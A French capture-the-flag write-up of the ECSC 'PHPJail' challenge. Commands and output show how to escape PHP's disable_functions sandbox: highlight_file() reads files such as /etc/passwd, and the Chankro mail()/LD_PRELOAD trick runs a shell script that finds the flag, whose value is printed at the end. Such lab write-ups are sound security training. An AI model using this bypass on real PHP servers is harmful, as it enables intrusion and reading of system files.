# [ECSC] - PHPJail


## Description

> Saurez-vous sortir de cette prison PHP pour retrouver le fichier flag présent sur le système ?

## Etat des lieux

Nous sommes face à une jail PHP, commençons par un `phpinfo();` histoire de voir ce qui n'est pas autorisé:

```bash
➜  phpjail cat <(echo "phpinfo();") - | nc challenges.ecsc-teamfrance.fr 4002
    /// PHP JAIL ////

    There's a file named flag on this filesystem.
    Find it.
    Read it.
    Flag it.


Enter your command: phpinfo()
PHP Version => 7.0.33-0+deb9u3
[...]
disable_classes => Directory, DirectoryIterator, FilesystemIterator, GlobIterator, RecursiveDirectoryIterator, SplFileObject, SplFileInfo => Directory, DirectoryIterator, FilesystemIterator, GlobIterator, RecursiveDirectoryIterator, SplFileObject, SplFileInfo
disable_functions => system, exec, shell_exec, passthru, show_source, popen, proc_open, fopen_with_path, dbmopen, dbase_open, move_uploaded_file, chdir, mkdir, rmdir, rename, filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo, fopen, fread, file_get_contents, readfile, opendir, readdir, scandir, glob, file, dir, posix_ctermid, posix_getcwd, posix_getegid, posix_geteuid, posix_getgid, posix_getgrgid, posix_getgrnam, posix_getgroups, posix_getlogin, posix_getpgid, posix_getpgrp, posix_getpid, posix, _getppid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_getsid, posix_getuid, posix_isatty, posix_kill, posix_mkfifo, posix_setegid, posix_seteuid, posix_setgid, posix_setpgid, posix_setsid, posix_setuid, posix_times, posix_ttyname, posix_uname, virtual, openlog, closelog, ini_set, ini_restore, ignore_user_abort, link, pcntl_alarm, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_setpriority, pcntl_signal, pcntl_signal_dispatch, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig, ftp_connect, ftp_exec, ftp_get, ftp_login, ftp_nb_fput, ftp_put, ftp_raw, ftp_rawlist, is_dir => system, exec, shell_exec, passthru, show_source, popen, proc_open, fopen_with_path, dbmopen, dbase_open, move_uploaded_file, chdir, mkdir, rmdir, rename, filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo, fopen, fread, file_get_contents, readfile, opendir, readdir, scandir, glob, file, dir, posix_ctermid, posix_getcwd, posix_getegid, posix_geteuid, posix_getgid, posix_getgrgid, posix_getgrnam, posix_getgroups, posix_getlogin, posix_getpgid, posix_getpgrp, posix_getpid, posix, _getppid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_getsid, posix_getuid, posix_isatty, posix_kill, posix_mkfifo, posix_setegid, posix_seteuid, posix_setgid, posix_setpgid, posix_setsid, posix_setuid, posix_times, posix_ttyname, posix_uname, virtual, openlog, closelog, ini_set, ini_restore, ignore_user_abort, link, pcntl_alarm, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_setpriority, pcntl_signal, pcntl_signal_dispatch, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig, ftp_connect, ftp_exec, ftp_get, ftp_login, ftp_nb_fput, ftp_put, ftp_raw, ftp_rawlist, is_dir
[...]
```

Bon, ça fait un paquet de choses interdites.

## Read everywhere

La fonction `highlight_file();` n'est pas bloqué, on va s'en servir pour lire des fichiers :

```bash
➜  phpjail cat <(echo "highlight_file('/etc/passwd');") - | nc challenges.ecsc-teamfrance.fr 4002

    /// PHP JAIL ////

    There's a file named flag on this filesystem.
    Find it.
    Read it.
    Flag it.


Enter your command: <code><span style="color: #000000">
root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />bin:x:2:2:bin:/bin:/usr/sbin/nologin<br />sys:x:3:3:sys:/dev:/usr/sbin/nologin<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/usr/sbin/nologin<br />man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br />lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br />mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br />news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br />uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br />proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br />www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br />backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br />list:x:38:38:Mailing&nbsp;List&nbsp;Manager:/var/list:/usr/sbin/nologin<br />irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br />gnats:x:41:41:Gnats&nbsp;Bug-Reporting&nbsp;System&nbsp;(admin):/var/lib/gnats:/usr/sbin/nologin<br />nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br />_apt:x:100:65534::/nonexistent:/bin/false<br />Debian-exim:x:101:101::/var/spool/exim4:/bin/false<br />messagebus:x:102:103::/var/run/dbus:/bin/false<br />user0:x:999:999::/home/user0:/bin/zsh<br /></span>
</code>
Bye!
```

## Command execution

On peut remarquer que la fonction `mail();` n'est pas non plus bloquée, on pourrait s'en servir.

> https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/

Tarlogic a fait un outil permettant de créer un fichier PHP avec le payload et les libs embarqués:

> https://github.com/TarlogicSecurity/Chankro

Premièrement, localiser le fichier flag:

```bash
(Chankro) ➜  Chankro git:(master) ✗ cat rev.sh
#!/bin/sh

find / -name flag > /tmp/asas

(Chankro) ➜  Chankro git:(master) ✗ python chankro.py --arch 64 --input rev.sh --output chan.php --path /tmp/


     -=[ Chankro ]=-
    -={ @TheXC3LL }=-


[+] Binary file: rev.sh
[+] Architecture: x64
[+] Final PHP: chan.php


[+] File created!
```

Pour pouvoir executer le contenu de `chan.php` on va virer les balises PHP `<?php ?>` et les saut de lignes. Lorsque c'est fait, il ne reste plus qu'à l'envoyer:

```bash
(Chankro) ➜  Chankro git:(master) ✗ cat chan.php - | nc challenges.ecsc-teamfrance.fr 4002
[...]
Enter your command:
Bye!

(Chankro) ➜  Chankro git:(master) ✗ cat <(echo "highlight_file('/tmp/asas');") - | nc challenges.ecsc-teamfrance.fr 4002
[...]
Enter your command: <code><span style="color: #000000">
/home/user0/.sensitive/randomdir/flag<br />/usr/local/lib/python2.7/dist-packages/pwnlib/flag<br /></span>
</code>
Bye!
```

> /home/user0/.sensitive/randomdir/flag

```bash
(Chankro) ➜  Chankro git:(master) ✗ cat <(echo "highlight_file('/home/user0/.sensitive/randomdir/flag');") - | nc challenges.ecsc-teamfrance.fr 4002
[...]
Enter your command: <code><span style="color: #000000">
ECSC{22b1843abfd76008ce3683e583c66e85c6bbdc65}<br /></span>
</code>
Bye!
```

## Flag

> ECSC{22b1843abfd76008ce3683e583c66e85c6bbdc65}
